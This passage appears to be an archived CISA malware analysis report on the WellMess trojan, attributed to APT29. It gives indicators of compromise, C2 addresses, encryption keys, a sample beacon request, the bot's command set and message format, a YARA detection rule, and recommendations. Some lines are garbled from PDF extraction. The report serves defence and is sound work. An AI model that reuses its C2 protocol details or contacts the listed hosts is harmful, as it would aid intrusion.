encrypt the data:\n\n—Begin RC6 Key—\nOHVbn3Fdv/sgvP9VRO/9OQ==\n—End RC6 Key—\n\nThe encrypted data is encoded using the Base64 encoding function. It trims base64 \"=\" | \"/\" | \":\" and adds spaces with the\n\"botlib.Base64ToNormal\" function.\n\nDisplayed below is an example of how the Base64 encoded data is trimmed:\n\n—Begin Base64 encoded data—\nlSBUYfP7=sW93f+%2CKH+o%2CGNb+iL2o8jb+LWRTcTH+v20b+XP22L+bgli+B4E.+JaA+yVyKo+A%3Am+N8b+Hgf5+%3AzL69zU+2m8B+AzvP\n6uDqNtIN=1.+9B7sUM+571cpj6+hfB+vdjukEY+xeS+iWSN+XbtVIB+4fxCCL.+a9el+eX90Q+hTImb+kE2pi+uV2XuDZj\n—End Base64 encoded data—\n\nThe final trimmed Base64 encoded data is stored in the Cookie header. The malware communicates with it C2 server at the IP address\n103.73.188.101 using HTTP requests which are RSA-encrypted and Base64 encoded. The \"Cookie\" header will contain the RC6 encrypted\ninformation, including the system unique identifier, mentioned above. The bottom of the message body will contain a dynamically generated\n\n\n-----\n\nS ey c s e c ypted ut g a a d coded pub c S ey e S ey be ut ed to t a s e C data bet ee t e e ote\noperator and the malware, including executable scripts which are executed on the target system.\n\nAnalysis indicates that once a connection is established, the malware is designed to initiate command and control service from the remote\noperator using the function \"botlib.Work\". It performs functions based on the received commands:\n\n—Begin Functions—\nFile upload\nFile download\nChange user-agent string\n—End Functions—\n\nThe following Public Key is used for secure communication with the C2:\n\n—Begin Public Key—\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqU3sMUB/SEWHNe8xNSFG\nDMylqo/BsMvI9OdNb3keEuW57nmFctMiecNZu9c+ZGYTWBSU07cbxU045tlFOprY\nnhbnnnjgEDA9JCA12CUIJ5L74ERo8FuBLC18FoL5QtBrXm65RdxxuP3CRghg0amR\nS5aFpW8p3kpdIINXsXasnjFBw+q009u7w6rDXkK2hrpIvF2fzIrs7DrRwwKJ2lCf\nxgnhY00UWHohjOj3ecQQJMn71puy94pCmpv+7zAyCiYYTNyhC29xUAH1j6aBAVKI\nkuBXqd6461MJkGNI0pdIUev9BDeK74B7vmZ6TbQrdQ27+bNVTg6qqai+6vwLFxUB\nBwIDAQAB\n—End Public Key—\n\n**103.73.188.101**\n\nTags\n\ncommand-and-control\n\nPorts\n\n80 TCP\n\nHTTP Sessions\n\nPOST / HTTP/1.1\n\nHost: 103.73.188.101\n\nUser-Agent: Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0\n\nContent-Length: 423\n\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\n\nCookie:\nlSBUYfP7=sW93f+%2CKH+o%2CGNb+iL2o8jb+LWRTcTH+v20b+XP22L+bgli+B4E.+JaA+yVyKo+A%3Am+N8b+Hgf5+%3AzL69zU+2m8B+\n6uDqNtIN=1.+9B7sUM+571cpj6+hfB+vdjukEY+xeS+iWSN+XbtVIB+4fxCCL.+a9el+eX90Q+hTImb+kE2pi+uV2XuDZj\n\nAccept-Encoding: gzip\n\nZ25gZ5A PuN nSBtz 5USoc 8HrEN9 DsA 2UqoV gUVciJ Ur3. RCa qNs lDr3FO vITG H69jRJ7 bfGbc8 UrO8tT LLaKll. uVuNP eKC 9uH\npHy UY3G,w7 B7D6OR r:L CmaikCh. BYoOSbM aMIHrd L25LVy Gpd2jI8 kcW R98au Evcg HSFp0D9. tMg DhtzW 6Lh FuzXBD ypERa\n2y:d0Bq uPnAw vyIvE. rp0LXY E6mW3E gUUJpf P1sRa9r riNN9g0 rXHfvl kly ZqZ:FB. ejr FpzCq Ey23 t0A PjPM fnlL jpr J4,0DPy. WyeM\niMcK ahpo7 tIqNkH,aYzcG OnawAk iRmPT :b0PIiN. 2q: p1k5 nD5D6lg\n\nWhois\n\nQueried whois.apnic.net with \"103.73.188.101\"...\n\n% Information related to '103.73.188.0 - 103.73.191.255'\n\n% Abuse contact for '103.73.188.0 - 103.73.191.255' is 'query@evokedigital.in'\n\ninetnum:    103.73.188.0 - 103.73.191.255\n\nnetname:    EVOKEDS\n\ndescr:     Evoke Digital Solutions\n\nadmin-c:    RK634-AP\n\ntech-c:     RK634-AP\n\ncountry:    IN\n\nmnt-by:     MAINT-IN-IRINN\n\nmnt-irt:    IRT-EVOKEDS-IN\n\nmnt-routes:   MAINT-IN-EVOKEDS\n\n\n-----\n\nstatus SS G O\nlast-modified: 2016-08-30T11:20:02Z\nsource:     APNIC\n\nirt:      IRT-EVOKEDS-IN\naddress:    371, Jagjivan Ram Nagar, Patnipura,Indore,Madhya Pradesh-452001\ne-mail:     radhe@evokedigital.in\nabuse-mailbox: query@evokedigital.in\nadmin-c:    RK634-AP\ntech-c:     RK634-AP\nauth:     # Filtered\nmnt-by:     MAINT-IN-EVOKEDS\nlast-modified: 2016-08-30T11:13:51Z\nsource:     APNIC\n\nperson:     Rajat Keshriya\naddress:    371, Jagjivan Ram Nagar, Patnipura,Indore,Madhya Pradesh-452001\ncountry:    IN\nphone:     +91 9993099926\ne-mail:     radhe@evokedigital.in\nnic-hdl:    RK634-AP\nmnt-by:     MAINT-IN-EVOKEDS\nlast-modified: 2016-08-30T11:14:18Z\nsource:     APNIC\n\n% Information related to '103.73.188.0/24AS135752'\n\nroute:     103.73.188.0/24\ndescr:     Evoke Digital Solutions Route object\norigin:     AS135752\ncountry:    IN\nnotify:     radhe@evokedigital.in\nmnt-by:     MAINT-IN-IRINN\nmnt-routes:   MAINT-IN-EVOKEDS\nlast-modified: 2016-09-19T09:13:33Z\nsource:     APNIC\n\n% This query was served by the APNIC Whois Service version 1.88.15-SNAPSHOT (WHOIS-US3)\nRelationships\n\n103.73.188.101 Connected_From e329607379a01483fc914a47c0062d5a3a8d8d65f777fbad2c5a841a90a0af09\n\n103.73.188.101 Connected_From 14e9b5e214572cb13ff87727d680633f5ee238259043357c94302654c546cad2\n\nDescription\n\ne329607379a01483fc914a47c0062d5a3a8d8d65f777fbad2c5a841a90a0af09 and\n14e9b5e214572cb13ff87727d680633f5ee238259043357c94302654c546cad2 attempt to connect to the IP address.\n\n**14e9b5e214572cb13ff87727d680633f5ee238259043357c94302654c546cad2**\n\nTags\n\ntrojan\n\nDetails\n\n**Name** 14e9b5e214572cb13ff87727d680633f5ee238259043357c94302654c546cad2\n\n**Size** 2430280 bytes\n\n**Type** ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux)\n\n**MD5** 861879f402fe3080ab058c0c88536be4\n\n**SHA1** db4f07ecefd1e290d727379ded4f15a0d4a59f88\n\n**SHA256** 14e9b5e214572cb13ff87727d680633f5ee238259043357c94302654c546cad2\n\n**SHA512** dd2cb0f9f0c5fb985bfc58867399a72989606066b5d943b2074bf04769175f26c19a354bb7e012a74c54a772c86d5152c46f4617f6d84e49\n\n**ssdeep** 49152:c+b/fDJqZxtZWU71nFqO8apKC9AS7aAZYgBEB:R38xtZ/71FqODKCn8\n\n\n-----\n\n**Entropy** 7.912054\n\nAntivirus\n\n**Avira** LINUX/Agent.pzcai\n\n**BitDefender** Trojan.Linux.GenericA.37725\n\n**ClamAV** Unix.Malware.Agent-7376649-0\n\n**ESET** a variant of Linux/WellMess.B trojan\n\n**Emsisoft** Trojan.Linux.GenericA.37725 (B)\n\n**Ikarus** Trojan.Linux.Agent\n\nYARA Rules\n\n\n-----\n\nu e C S _ 0 96 8 _0 t oja SS\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nDate= \"2020-07-06\"\nLast_Modified=\"20200706_1017\"\nActor=\"n/a\"\nCategory=\"Trojan\"\nFamily=\"WellMess\"\nDescription = \"Detects WellMess implant and SangFor Exploit\"\nMD5_1 = \"4d38ac3319b167f6c8acb16b70297111\"\nSHA256_1 = \"7c39841ba409bce4c2c35437ecf043f22910984325c70b9530edf15d826147ee\"\nMD5_2 = \"a32e1202257a2945bf0f878c58490af8\"\nSHA256_2 = \"a4b790ddffb3d2e6691dcacae08fb0bfa1ae56b6c73d70688b097ffa831af064\"\nMD5_3 = \"861879f402fe3080ab058c0c88536be4\"\nSHA256_3 = \"14e9b5e214572cb13ff87727d680633f5ee238259043357c94302654c546cad2\"\nMD5_4 = \"2f9f4f2a9d438cdc944f79bdf44a18f8\"\nSHA256_4 = \"e329607379a01483fc914a47c0062d5a3a8d8d65f777fbad2c5a841a90a0af09\"\nMD5_5 = \"ae7a46529a0f74fb83beeb1ab2c68c5c\"\nSHA256_5 = \"fd3969d32398bbe3709e9da5f8326935dde664bbc36753bd41a0b111712c0950\"\nMD5_6 = \"f18ced8772e9d1a640b8b4a731dfb6e0\"\nSHA256_6 = \"953b5fc9977e2d50f3f72c6ce85e89428937117830c0ed67d468e2d93aa7ec9a\"\nMD5_7 = \"3a9cdd8a5cbc3ab10ad64c4bb641b41f\"\nSHA256_7 = \"5ca4a9f6553fea64ad2c724bf71d0fac2b372f9e7ce2200814c98aac647172fb\"\nMD5_8 = \"967fcf185634def5177f74b0f703bdc0\"\nSHA256_8 = \"58d8e65976b53b77645c248bfa18c3b87a6ecfb02f306fe6ba4944db96a5ede2\"\nMD5_9 = \"c5d5cb99291fa4b2a68b5ea3ff9d9f9a\"\nSHA256_9 = \"65495d173e305625696051944a36a031ea94bb3a4f13034d8be740982bc4ab75\"\nMD5_10 = \"01d322dcac438d2bb6bce2bae8d613cb\"\nSHA256_10 = \"0c5ad1e8fe43583e279201cdb1046aea742bae59685e6da24e963a41df987494\"\nMD5_11 = \"8777a9796565effa01b03cf1cea9d24d\"\nSHA256_11 = \"83014ab5b3f63b0253cdab6d715f5988ac9014570fa4ab2b267c7cf9ba237d18\"\nMD5_12 = \"507bb551bd7073f846760d8b357b7aa9\"\nSHA256_12 = \"47cdb87c27c4e30ea3e2de620bed380d5aed591bc50c49b55fd43e106f294854\"\nstrings:\n$0 = \"/home/ubuntu/GoProject/src/bot/botlib/chat.go\"\n$1 = \"/home/ubuntu/GoProject/src/bot/botlib.Post\"\n$2 = \"GoProject/src/bot/botlib.deleteFile\"\n$3 = \"ubuntu/GoProject/src/bot/botlib.generateRandomString\"\n$4 = \"GoProject/src/bot/botlib.AES_Decrypt\"\n$5 = { 53 00 63 00 72 00 69 00 70 00 74 00 00 0F 63 00 6D 00 64 00 2E 00 65 00 78 00 65 00 00 07 2F 00 63 }\n$6 = { 3C 00 6E 00 77 00 3E 00 2E 00 2A 00 29 00 00 0B 24 00 7B 00 66 00 6E 00 7D }\n$7 = { 7B 00 61 00 72 00 67 00 7D 00 00 0B 24 00 7B 00 6E 00 77 00 7D }\n$8 = { 52 61 6E 64 6F 6D 53 74 72 69 6E 67 00 44 65 6C 65 74 65 46 69 6C 65 }\n$9 = \"get_keyRC6\"\n$10 = { 7D A3 26 77 1D 63 3D 5A 32 B4 6F 1F 55 49 44 25 }\n$11 = { 47 C2 2F 35 93 41 2F 55 73 0B C2 60 AB E1 2B 42 }\n$12 = { 53 58 9B 17 1F 45 BD 72 EC 01 30 6C 4F CA 93 1D }\n$13 = { 48 81 21 81 5F 53 3A 64 E0 ED FF 21 23 E5 00 12 }\n$14 = \"GoProject/src/bot/botlib.wellMess\"\n$15 = { 62 6F 74 6C 69 62 2E 4A 6F 69 6E 44 6E 73 43 68 75 6E 6B 73 }\n$16 = { 62 6F 74 6C 69 62 2E 45 78 65 63 }\n$17 = { 62 6F 74 6C 69 62 2E 47 65 74 52 61 6E 64 6F 6D 42 79 74 65 73 }\n$18 = { 62 6F 74 6C 69 62 2E 4B 65 79 }\n$19 = { 7F 16 21 9D 7B 03 CB D9 17 3B 9F 27 B3 DC 88 0F }\n$20 = { D9 BD 0A 0E 90 10 B1 39 D0 C8 56 58 69 74 15 8B }\n$21 = { 44 00 59 00 4A 00 20 00 36 00 47 00 73 00 62 00 59 00 31 00 2E }\n$22 = { 6E 00 20 00 46 00 75 00 7A 00 2C 00 4B 00 5A 00 20 00 33 00 31 00 69 00 6A 00 75 }\n$23 = { 43 00 31 00 69 00 76 00 66 00 39 00 32 00 20 00 56 00 37 00 6C 00 4F 00 48 }\n$24 = { 66 69 6C 65 4E 61 6D 65 3A 28 3F 50 3C 66 6E 3E 2E 2A 3F 29 5C 73 61 72 67 73 3A 28 3F 50 3C 61 72 67 3E 2E 2A 3F }\n$25 = { 5C 00 2E 00 53 00 61 00 6E 00 67 00 66 00 6F 00 72 00 55 00 44 00 2E 00 73 00 75 00 6D }\n$26 = { 66 6F 72 6D 2D 64 61 74 61 3B 20 6E 61 6D 65 3D 22 5F 67 61 22 3B 20 66 69 6C 65 6E 61 6D 65 3D }\n$27 = { 40 5B 5E 5C 73 5D 2B 3F 5C 73 28 3F 50 3C 74 61 72 3E 2E 2A 3F 29 5C 73 27 }\ncondition:\n\n\n-----\n\n($0 a d $ a d $ a d $3 a d $ ) o ($5 a d $6 a d $ a d $8 a d $9) o ($ 0 a d $ ) o ($ a d $ 3) o ($ ) o ($ 5 a d $ 6\nand $17 and $18) or ($19 and $20) or ($21 and $22 and $23) or ($24) or ($25 and $26) or ($27)\n}\n\nssdeep Matches\n\nNo matches found.\n\nRelationships\n\n14e9b5e214... Connected_To 103.73.188.101\n\nDescription\n\nThis artifact is an Ultimate Packer for eXecutable (UPX) archive containing an ELF 64-bit file written in Go that supports Korean, Japanese,\nTraditional Chinese, and Simplified Chinese languages. It has been identified as a variant of the WellMess malware family.\n\nThe program is capable of encrypting, decrypting, uploading and downloading files. It can also execute commands and send and receive\nencrypted messages. The following is a list of the malware’s capabilities:\n\n— Begin Bot Capabilities —\nbotlib.EncryptText\nbotlib.encrypt\nbotlib.Command\nbotlib.transformRighttBytes\nbotlib.reply\nbotlib.Service\nbotlib.saveFile\nbotlib.UDFile\nbotlib.Download\nbotlib.Send\nbotlib.Work\nbotlib.chunksM\nbotlib.Join\nbotlib.wellMess\nbotlib.RandStringBytes\nbotlib.GetRandomBytes\nbotlib.Key\nbotlib.GenerateSymmKey\nbotlib.CalculateMD5Hash\nbotlib.Transf\nbotlib.GetLocale\nbotlib.Parse\nbotlib.Pack\nbotlib.Unpack\nbotlib.UnpackB\nbotlib.FromNormalToBase64\nbotlib.RandInt\nbotlib.Base64ToNormal\nbotlib.KeySizeError.Error\nbotlib.New\nbotlib.(*rc6cipher).BlockSize\nbotlib.convertFromString\nbotlib.(*rc6cipher).Encrypt\nbotlib.(*rc6cipher).Decrypt\nbotlib.Split\nbotlib.Cipher\nbotlib.Decipher\nbotlib.Pad\nbotlib.AES_Encrypt\nbotlib.AES_Decrypt\nbotlib.generateRandomString\nbotlib.deleteFile\nbotlib.Post\nbotlib.SendMessage\nbotlib.ReceiveMessage\nbotlib Send func1\n\n\n-----\n\nbot b t\nbotlib.(*KeySizeError).Error\n— End Bot Capabilities —\n\nWhen the program is executed it will attempt to contact its C2 at the IP address, 103.73.188.101 over TCP port 80. The program collects the IP\naddress of the victim system, current username, and domain to send to the C2. This data string is appended with a unique SHA256 hash. The\ncompleted string is then RC6 encrypted and then Base64 encoded. Non-random characters are interspersed into the Base64 string for further\nobfuscation. The following is an example of the encoded string:\n\n— Begin Encoded String Sample —\nHNX7A5nA=UUn5+2g6J+emwEU+MSkFqW+FAtoNc+dtFnr.+dHFn3ip+P8I+r19+B7s+UM571cp+j6hf+BvdjukE+YxeSiW.+SNXbt+VIB4fxC+CLa9el\n— End Encoded String Sample —\n\nThe string is used to uniquely identify communication to and from the C2. Messages are formatted in the following manner:\n\n— Begin Message Format —\n<;head;>3230302e3230302e3230302e3232317c7c757365727c75736572e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852\n<;title;>rc<;title;><;service;><;service;>\n— End Message Format —\n\nIn the message above the hexadecimal string between the <head> delimiters is the original encoded string. This string translates as the\nfollowing:\n\n— Begin String Translate —\n200.200.200.221||user|user e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\n— End String Translate —\n\nData between the <title> delimiters control the session, while data between the <service> delimiters relate to commands. Some of the\ncommands include the following:\n\n— Begin Commands —\n(fu) File upload\n(fd) File download\n(u) Change user-agent string\n— End Commands —\n\nDuring each C2 session an AES key is dynamically generated. The AES key is encrypted via an embedded hard coded RSA public key before\nbeing delivered to the remote operator / C2 server. This AES key will be utilized to secure C2 sessions. The following Public Key is used for\nsecure communication with the C2:\n\n—Begin Public Key—\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqU3sMUB/SEWHNe8xNSFG\nDMylqo/BsMvI9OdNb3keEuW57nmFctMiecNZu9c+ZGYTWBSU07cbxU045tlFOprY\nnhbnnnjgEDA9JCA12CUIJ5L74ERo8FuBLC18FoL5QtBrXm65RdxxuP3CRghg0amR\nS5aFpW8p3kpdIINXsXasnjFBw+q009u7w6rDXkK2hrpIvF2fzIrs7DrRwwKJ2lCf\nxgnhY00UWHohjOj3ecQQJMn71puy94pCmpv+7zAyCiYYTNyhC29xUAH1j6aBAVKI\nkuBXqd6461MJkGNI0pdIUev9BDeK74B7vmZ6TbQrdQ27+bNVTg6qqai+6vwLFxUB\nBwIDAQAB\n—End Public Key—\n\n## Relationship Summary\n\n953b5fc997... Created 47cdb87c27c4e30ea3e2de620bed380d5aed591bc50c49b55fd43e106f294854\n\n47cdb87c27... Connected_To 85.93.2.116\n\n47cdb87c27... Created_By 953b5fc9977e2d50f3f72c6ce85e89428937117830c0ed67d468e2d93aa7ec9a\n\n85.93.2.116 Connected_From 47cdb87c27c4e30ea3e2de620bed380d5aed591bc50c49b55fd43e106f294854\n\n5ca4a9f655... Connected_To 209.58.186.196\n\n5ca4a9f655... Connected_To 141.98.212.55\n\n141.98.212.55 Connected_From 5ca4a9f6553fea64ad2c724bf71d0fac2b372f9e7ce2200814c98aac647172fb\n\n209.58.186.196 Connected_From 5ca4a9f6553fea64ad2c724bf71d0fac2b372f9e7ce2200814c98aac647172fb\n\n7c39841ba4... Connected_To 192.48.88.107\n\n\n-----\n\n192.48.88.107 Connected_From 7c39841ba409bce4c2c35437ecf043f22910984325c70b9530edf15d826147ee\n\n192.48.88.107 Connected_From fd3969d32398bbe3709e9da5f8326935dde664bbc36753bd41a0b111712c0950\n\nfd3969d323... Connected_To 192.48.88.107\n\ne329607379... Connected_To 103.73.188.101\n\n103.73.188.101 Connected_From e329607379a01483fc914a47c0062d5a3a8d8d65f777fbad2c5a841a90a0af09\n\n103.73.188.101 Connected_From 14e9b5e214572cb13ff87727d680633f5ee238259043357c94302654c546cad2\n\n14e9b5e214... Connected_To 103.73.188.101\n\n## Recommendations\n\nCISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their\norganization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid\nunwanted impacts.\n\nMaintain up-to-date antivirus signatures and engines.\nKeep operating system patches up-to-date.\nDisable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.\nRestrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group\nunless required.\nEnforce a strong password policy and implement regular password changes.\nExercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.\nEnable a personal firewall on agency workstations, configured to deny unsolicited connection requests.\nDisable unnecessary services on agency workstations and servers.\nScan for and remove suspicious e-mail attachments; ensure the scanned attachment is its \"true file type\" (i.e., the extension matches the\nfile header).\nMonitor users' web browsing habits; restrict access to sites with unfavorable content.\nExercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).\nScan all software downloaded from the Internet prior to executing.\nMaintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).\n\nAdditional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST)\nSpecial Publication 800-83, \"Guide to Malware Incident Prevention & Handling for Desktops and Laptops\".\n\n## Contact Information\n\n1-888-282-0870\nCISA Service Desk (UNCLASS)\nCISA SIPR (SIPRNET)\nCISA IC (JWICS)\n\nCISA continuously strives to improve its products and services. You can help by answering a very short series of questions about this product\n[at the following URL: https://www.cisa.gov/forms/feedback/](https://www.cisa.gov/forms/feedback/)\n\n## Document FAQ\n\n**What is a MIFR? A Malware Initial Findings Report (MIFR) is intended to provide organizations with malware analysis in a timely manner. In**\nmost instances this report will provide initial indicators for computer and network defense. To request additional analysis, please contact CISA\nand provide information regarding the level of desired analysis.\n\n**What is a MAR? A Malware Analysis Report (MAR) is intended to provide organizations with more detailed malware analysis acquired via**\nmanual reverse engineering. To request additional analysis, please contact CISA and provide information regarding the level of desired\nanalysis.\n\n**Can I edit this document? This document is not to be edited in any way by recipients. All comments or questions related to this document**\nshould be directed to the CISA at 1-888-282-0870 or CISA Service Desk.\n\n**Can I submit malware to CISA? Malware samples can be submitted via three methods:**\n\nWeb: [https://malware.us-cert.gov](https://malware.us-cert.gov/)\nE-Mail: submit@malware.us-cert.gov\nFTP: ftp.malware.us-cert.gov (anonymous)\n\n\n-----\n\nC S e cou ages you to epo t a y susp c ous act ty, c ud g cybe secu ty c de ts, poss b e a c ous code, so t a e u e ab t es, a d\n[phishing-related scams. Reporting forms can be found on CISA's homepage at www.cisa.gov.](http://www.cisa.gov/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-07-16 - Malware Analysis Report (AR20-198B).pdf"
    ],
    "report_names": [
        "2020-07-16 - Malware Analysis Report (AR20-198B).pdf"
    ],
    "threat_actors": [
        {
            "id": "5b748f86-ac32-4715-be9f-6cf25ae48a4e",
            "created_at": "2024-06-04T02:03:07.956135Z",
            "updated_at": "2025-03-27T02:05:17.407352Z",
            "deleted_at": null,
            "main_name": "IRON HEMLOCK",
            "aliases": [
                "ATK7 ",
                "Blue Kitsune ",
                "Cozy Bear ",
                "The Dukes",
                "UNC2452 ",
                "YTTRIUM ",
                "APT29 "
            ],
            "source_name": "Secureworks:IRON HEMLOCK",
            "tools": [
                " CozyCar",
                " CozyDuke",
                " DiefenDuke",
                " FatDuke",
                " HAMMERTOSS",
                " LiteDuke",
                " MiniDuke",
                " OnionDuke",
                " PolyglotDuke",
                " RegDuke",
                " RegDuke Loader",
                " SeaDuke",
                " Sliver",
                "CosmicDuke"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a241a1ca-2bc9-450b-a07b-aae747ee2710",
            "created_at": "2024-06-19T02:03:08.150052Z",
            "updated_at": "2025-03-27T02:05:17.409596Z",
            "deleted_at": null,
            "main_name": "IRON RITUAL",
            "aliases": [
                "Blue Dev 5 ",
                "BlueBravo ",
                "Cloaked Ursa ",
                "CozyLarch ",
                "Dark Halo ",
                "Midnight Blizzard ",
                "NOBELIUM ",
                "StellarParticle ",
                "UNC2452 ",
                "APT29"
            ],
            "source_name": "Secureworks:IRON RITUAL",
            "tools": [
                " Cobalt Strike",
                " EnvyScout",
                " GoldFinder",
                " GoldMax",
                " NativeZone",
                " RAINDROP",
                " SUNBURST",
                " Sibot",
                " TEARDROP",
                " VaporRage",
                "Brute Ratel C4"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "20d3a08a-3b97-4b2f-90b8-92a89089a57a",
            "created_at": "2022-10-25T15:50:23.548494Z",
            "updated_at": "2025-03-27T02:00:55.49688Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "APT29",
                "IRON RITUAL",
                "IRON HEMLOCK",
                "NobleBaron",
                "Dark Halo",
                "NOBELIUM",
                "UNC2452",
                "YTTRIUM",
                "The Dukes",
                "Cozy Bear",
                "CozyDuke",
                "SolarStorm",
                "Blue Kitsune",
                "UNC3524",
                "Midnight Blizzard"
            ],
            "source_name": "MITRE:APT29",
            "tools": [
                "PinchDuke",
                "ROADTools",
                "WellMail",
                "CozyCar",
                "Mimikatz",
                "Tasklist",
                "OnionDuke",
                "FatDuke",
                "POSHSPY",
                "EnvyScout",
                "SoreFang",
                "GeminiDuke",
                "GoldMax",
                "FoggyWeb",
                "SDelete",
                "PolyglotDuke",
                "AADInternals",
                "MiniDuke",
                "SeaDuke",
                "Sibot",
                "RegDuke",
                "CloudDuke",
                "GoldFinder",
                "AdFind",
                "PsExec",
                "NativeZone",
                "Systeminfo",
                "ipconfig",
                "Impacket",
                "Cobalt Strike",
                "PowerDuke",
                "QUIETEXIT",
                "HAMMERTOSS",
                "BoomBox",
                "CosmicDuke",
                "WellMess",
                "VaporRage",
                "LiteDuke"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "46b3c0fc-fa0c-4d63-a38a-b33a524561fb",
            "created_at": "2023-01-06T13:46:38.393409Z",
            "updated_at": "2025-03-27T02:00:02.822155Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "The Dukes",
                "Minidionis",
                "Grizzly Steppe",
                "G0016",
                "Blue Kitsune",
                "BlueBravo",
                "SeaDuke",
                "Cloaked Ursa",
                "YTTRIUM",
                "ATK7",
                "Nobelium",
                "UAC-0029",
                "Group 100",
                "COZY BEAR",
                "IRON HEMLOCK",
                "TA421",
                "ITG11"
            ],
            "source_name": "MISPGALAXY:APT29",
            "tools": [
                "QUARTERRIG",
                "SNOWYAMBER",
                "HALFRIG"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535644,
    "ts_updated_at": 1743041755,
    "ts_creation_date": 1653786300,
    "ts_modification_date": 1653786300,
    "files": {
        "pdf": "https://archive.orkl.eu/b3e746b238093cc5eda77905bea896d80691bf4d.pdf",
        "text": "https://archive.orkl.eu/b3e746b238093cc5eda77905bea896d80691bf4d.txt",
        "img": "https://archive.orkl.eu/b3e746b238093cc5eda77905bea896d80691bf4d.jpg"
    }
}